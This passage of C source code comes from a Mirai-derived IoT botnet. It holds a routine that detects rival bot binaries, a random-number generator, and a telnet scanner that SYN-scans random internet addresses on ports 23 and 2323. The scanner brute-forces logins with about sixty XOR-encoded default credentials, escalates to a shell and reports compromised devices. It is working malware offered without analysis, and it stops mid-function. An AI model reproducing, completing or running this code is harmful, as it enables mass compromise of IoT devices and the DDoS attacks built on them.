    table_unlock_val(TABLE_EXEC_JOSHO);
    table_unlock_val(TABLE_EXEC_APOLLO);
	
    m_mirai = table_retrieve_val(TABLE_EXEC_MIRAI, &m_mirai_len);
    m_sora1 = table_retrieve_val(TABLE_EXEC_SORA1, &m_sora1_len);
    m_sora2 = table_retrieve_val(TABLE_EXEC_SORA2, &m_sora2_len);
    m_owari = table_retrieve_val(TABLE_EXEC_OWARI, &m_owari_len);
    m_josho = table_retrieve_val(TABLE_EXEC_JOSHO, &m_josho_len);
    m_apollo = table_retrieve_val(TABLE_EXEC_APOLLO, &m_apollo_len);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if (mem_exists(rdbuf, ret, m_mirai, m_mirai_len) || 
		    mem_exists(rdbuf, ret, m_sora1, m_sora1_len) || 
			mem_exists(rdbuf, ret, m_sora2, m_sora2_len) ||
            mem_exists(rdbuf, ret, m_owari, m_owari_len) || 
		    mem_exists(rdbuf, ret, m_josho, m_josho_len) || 
			mem_exists(rdbuf, ret, m_apollo, m_apollo_len))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_EXEC_MIRAI);
    table_lock_val(TABLE_EXEC_SORA1);
    table_lock_val(TABLE_EXEC_SORA2);
    table_lock_val(TABLE_EXEC_OWARI);
    table_lock_val(TABLE_EXEC_JOSHO);
    table_lock_val(TABLE_EXEC_APOLLO);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}

#endif
#define _GNU_SOURCE

#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#include "includes.h"
#include "rand.h"
#include "util.h"
#include "table.h"

static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void)
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_alpha_str(uint8_t *str, int len)
{
	table_unlock_val(TABLE_RANDOM);
	
    char alpha_set[64];
	
    strcpy(alpha_set,table_retrieve_val(TABLE_RANDOM, NULL));
	
    while(len--)
        *str++ = alpha_set[rand_next() % util_strlen(alpha_set)];
	
	table_lock_val(TABLE_RANDOM);
}
#define _GNU_SOURCE

#ifdef WICKED_SCANNER

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "includes.h"
#include "scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"
#include "resolv.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[scanner] Failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;
	
    add_auth_entry("\x40\x40\x40\x05", "\x0E\x04\x06\x06", 10); // www2 9311
    add_auth_entry("\x40\x40\x40", "\x0E\x04\x06\x06", 10); // www 9311
    add_auth_entry("\x44\x52\x45\x41\x5E\x54\x52", "\x5E\x47\x53\x58\x59\x50\x5B\x52", 10); // service ipdongle
    add_auth_entry("\x7A\x45\x58\x58\x43", "\x54\x56\x43\x06\x07\x05\x0E", 10); // Mroot cat1029
    add_auth_entry("\x60\x47\x45\x58\x58\x43", "\x54\x56\x43\x06\x07\x05\x0E", 10); // Wproot cat1029
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x5B\x7D\x40\x47\x55\x58\x01", 9); // default lJwpbo6
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x64\x05\x51\x70\x46\x79\x71\x44", 9); // default S2fGqNFs
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x78\x4F\x5F\x5B\x40\x64\x70\x0F", 9); // default OxhlwSG8
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x53\x52\x51\x56\x42\x5B\x43", 1); // default default
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59", 9); // admin admin
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5F\x58\x03\x42\x5C\x42\x01\x56\x43", 1); // admin ho4uku6at
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x53\x41\x45\x05\x02\x0F\x07\x05\x05\x05", 1); // admin dvr2580222
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5A\x52\x5E\x59\x44\x5A", 1); // admin meinsm
    add_auth_entry("\x45\x58\x58\x43", "\x5E\x47\x54\x56\x5A\x68\x45\x43\x02\x04\x02\x07", 10); // root ipcam_rt5350
    add_auth_entry("\x45\x58\x58\x43", "\x02\x42\x47", 1); // root 5up
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x44\x42\x59\x06\x06\x0F\x0F", 1); // root zsun1188
    add_auth_entry("\x45\x58\x58\x43", "\x5F\x5E\x04\x02\x06\x0F", 1); // root hi3518
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5B\x4F\x4F\x19", 1); // root zlxx.
    add_auth_entry("\x45\x58\x58\x43", "\x41\x5E\x4D\x4F\x41", 1); // root vizxv
    add_auth_entry("\x41\x44\x43\x56\x45\x54\x56\x5A\x05\x07\x06\x02", "\x05\x07\x06\x02\x07\x01\x07\x05", 10); // vstarcam2015 20150602
    add_auth_entry("\x44\x42\x47\x47\x58\x45\x43", "\x44\x42\x47\x47\x58\x45\x43", 1); // support support
    add_auth_entry("\x42\x44\x52\x45", "\x42\x44\x52\x45", 1); // user user
    add_auth_entry("\x42\x44\x52\x45", "\x06\x05\x04\x03\x02", 1); // user 12345
    add_auth_entry("\x42\x44\x52\x45", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // user password
    add_auth_entry("\x50\x42\x52\x44\x43", "\x50\x42\x52\x44\x43", 1); // guest guest
    add_auth_entry("\x50\x42\x52\x44\x43", "\x06\x05\x04\x03\x02", 1); // guest 12345
    add_auth_entry("\x50\x42\x52\x44\x43", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // guest password
    add_auth_entry("\x45\x58\x58\x43", "\x45\x58\x58\x43", 1); // root root
    add_auth_entry("\x45\x58\x58\x43", "\x06\x05\x04\x03\x02\x01", 1); // root 123456
    add_auth_entry("\x45\x58\x58\x43", "\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F", 1); // root 88888888
    add_auth_entry("\x45\x58\x58\x43", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // root password
    add_auth_entry("\x45\x58\x58\x43", "\x47\x56\x44\x44", 1); // root pass
    add_auth_entry("\x45\x58\x58\x43", "\x56\x55\x54\x06\x05\x04", 1); // root abc123
    add_auth_entry("\x45\x58\x58\x43", "\x56\x53\x5A\x5E\x59", 1); // root admin
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x05\x04\x03", 1); // admin 1234
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // admin password
    add_auth_entry("\x45\x58\x58\x43", "\x56\x59\x5C\x58", 1); // root anko
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5A\x5E\x54\x45\x58\x55\x42\x44\x5E\x59\x52\x44\x44", 1); // admin microbusiness
    add_auth_entry("\x45\x58\x58\x43", "\x43\x07\x43\x56\x5B\x54\x07\x59\x43\x45\x07\x5B\x03\x16", 1); // root t0talc0ntr0l4!
    add_auth_entry("\x56\x53\x5A", "", 1); // adm
    add_auth_entry("\x55\x5E\x59", "", 1); // bin
    add_auth_entry("\x53\x56\x52\x5A\x58\x59", "\x53\x56\x52\x5A\x58\x59", 1); // daemon daemon
    add_auth_entry("\x45\x58\x58\x43", "\x4F\x5A\x5F\x53\x5E\x47\x54", 1); // root xmhdipc
    add_auth_entry("\x45\x58\x58\x43", "\x53\x52\x51\x56\x42\x5B\x43", 1); // root default
    add_auth_entry("\x45\x58\x58\x43", "\x5D\x42\x56\x59\x43\x52\x54\x5F", 1); // root juantech
    add_auth_entry("\x45\x58\x58\x43", "\x02\x03\x04\x05\x06", 1); // root 54321
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59\x06\x05\x04\x03", 1); // admin admin1234
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x74\x52\x59\x43\x42\x45\x4E\x7B\x06\x59\x5C", 1); // admin CenturyL1nk
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5E\x45\x58\x59\x47\x58\x45\x43", 1); // admin ironport
    add_auth_entry("\x45\x58\x58\x43", "\x06\x07\x07\x06\x54\x5F\x5E\x59", 1); // root 1001chim
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x4D\x5F\x58\x59\x50\x4F\x5E\x59\x50", 1); // admin zhongxing
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5F\x58\x59\x50\x4F\x5E\x59\x50", 1); // root zhongxing
    add_auth_entry("\x45\x58\x58\x43", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 1); // root changeme
    add_auth_entry("\x42\x44\x52\x45", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 1); // user changeme
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 1); // admin changeme
    add_auth_entry("\x41\x58\x5B\x5E\x43\x5E\x58\x59", "\x41\x58\x5B\x5E\x43\x5E\x58\x59", 1); // volition volition
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x56\x59\x43\x44\x5B\x46", 1); // default antslq
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x77\x59\x43\x41\x05\x07\x07\x07", 1); // admin c@ntv2000
    add_auth_entry("\x45\x58\x58\x43", "\x65\x78\x78\x63\x02\x07\x07", 1); // root ROOT500
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x59\x74\x40\x7A\x59\x7D\x61\x70\x56\x50", 1); // admin nCwMnJVGag
	
#ifdef DEBUG
    printf("[scanner] Scanner process initialized. Scanning started.\n");
#endif

    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0)
                {
                    tcph->dest = htons(2323);
                }
                else
                {
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 40)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[scanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[scanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 40)

                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[scanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(TABLE_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SYSTEM);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
			case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SH);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                table_unlock_val(TABLE_SCAN_QUERY);
                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
								if (++(conn->tries) >= 40)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[scanner] Failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
		char *ogin, *enter;
		
        table_unlock_val(TABLE_SCAN_OGIN);
		table_unlock_val(TABLE_SCAN_ENTER);
		
		ogin = table_retrieve_val(TABLE_SCAN_OGIN, &len);
		enter = table_retrieve_val(TABLE_SCAN_ENTER, &len);
		
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, ogin, len - 1) != -1))
            prompt_ending = tmp;
		
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, enter, len - 1) != -1))
            prompt_ending = tmp;
		
    }
        table_lock_val(TABLE_SCAN_OGIN);
		table_lock_val(TABLE_SCAN_ENTER);
		
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
